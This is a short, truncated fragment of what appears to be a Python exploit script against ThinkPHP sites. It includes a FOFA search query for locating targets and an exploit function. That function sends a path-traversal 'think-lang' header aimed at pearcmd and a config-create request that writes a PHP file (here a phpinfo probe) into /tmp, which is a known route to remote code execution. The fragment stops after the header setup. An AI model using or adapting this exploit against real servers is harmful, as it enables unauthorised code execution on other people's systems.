...
#fofa:  body="十年磨一剑-为API开发设计的高性能框架" && title=""
headers = {
...
def exploit(ip_, index):
    try:
        url = ip_+'/public/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php'
        headers.update({'think-lang':'../../../../../../../../usr/local/lib/php/pearcmd'})
        headers.update({'Cookie':'think_lang=zh-cn'})
